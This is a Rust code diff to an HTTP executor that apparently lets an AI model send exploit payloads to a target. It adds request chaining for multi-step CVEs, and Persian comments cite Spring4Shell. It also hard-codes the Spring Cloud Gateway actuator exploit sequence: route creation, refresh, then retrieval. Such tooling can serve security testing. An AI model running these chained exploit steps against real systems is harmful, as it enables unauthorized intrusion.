@@ -116,7 +116,33 @@ impl RawHttpExecutor {
             latency_ms,
         })
     }
-
+    
+    async fn execute_chain(&self, payload: &Value) -> Result<ExecutionOutcome, ExecutorError> {
+       if let Some(requests) = payload.get("requests").and_then(|v| v.as_array()) {
+            if requests.is_empty() {
+                return Err(ExecutorError::InvalidPayload(
+                    "'requests' array is empty".into(),
+                ));
+            }
+            let total = requests.len();
+            let mut last: Option<ExecutionOutcome> = None;
+            for (i, req) in requests.iter().enumerate() {
+                match self.execute_one(req).await {
+                    Ok(o) => last = Some(o),
+                    Err(e) => {
+                        return Err(ExecutorError::StepFailed {
+                            step: i + 1,
+                            total,
+                            inner: Box::new(e),
+                        });
+                    }
+                }
+            }
+            return Ok(last.unwrap());
+        }
+        self.execute_one(payload).await
+    }
+    
     pub fn new(
         base_url: impl Into<String>,
         default_method: impl Into<String>,
@@ -145,31 +171,32 @@ impl RawHttpExecutor {
 #[async_trait]
 impl TargetExecutor for RawHttpExecutor {
     async fn execute(&self, payload: &Value) -> Result<ExecutionOutcome, ExecutorError> {
-        // اگه payload یه آرایه‌ی `requests` داشت، همه رو به ترتیب اجرا کن و
-        // فقط *آخرین* response رو برگردون. این برای CVEهای چندمرحله‌ای
-        // (Spring4Shell: یه POST برای نوشتن shell، بعد یه GET برای اجراش).
-        if let Some(requests) = payload.get("requests").and_then(|v| v.as_array()) {
-            if requests.is_empty() {
-                return Err(ExecutorError::InvalidPayload(
-                    "'requests' array is empty".into(),
-                ));
-            }
-            let total = requests.len();
-            let mut last: Option<ExecutionOutcome> = None;
-            for (i, req) in requests.iter().enumerate() {
-                match self.execute_one(req).await {
-                    Ok(o) => last = Some(o),
-                    Err(e) => {
-                        return Err(ExecutorError::StepFailed {
-                            step: i + 1,
-                            total,
-                            inner: Box::new(e),
-                        });
-                    }
-                }
-            }
-            return Ok(last.unwrap());
+        eprintln!(" [DEBUG] RawHttpExecutor received payload: {}", payload);
+
+        // ── Auto-chain: CVEهای چندمرحله‌ای ──
+        let is_gateway_step1 = payload.get("requests").is_none()
+            && payload.get("path").and_then(|v| v.as_str())
+                == Some("/actuator/gateway/routes/hacktest");
+
+        if is_gateway_step1 {
+            eprintln!(" [INFO] auto-expanding Spring Cloud Gateway chain");
+            let chained = serde_json::json!({
+                "requests": [
+                    payload.clone(),
+                    {"method": "POST", "path": "/actuator/gateway/refresh"},
+                    {"method": "GET",  "path": "/actuator/gateway/routes/hacktest"}
+                ]
+            });
+            return self.execute_chain(&chained).await;
         }
+        // ▼▼▼ این دوتا بلاک جا افتاده بودن ▼▼▼
+
+        // اگه مدل خودش `requests` array داد، همون رو زنجیره‌ای اجرا کن
+        if payload.get("requests").and_then(|v| v.as_array()).is_some() {
+            return self.execute_chain(payload).await;
+        }
+
+        // درخواست تکی (رفتار پیش‌فرض)
         self.execute_one(payload).await
     }
 }
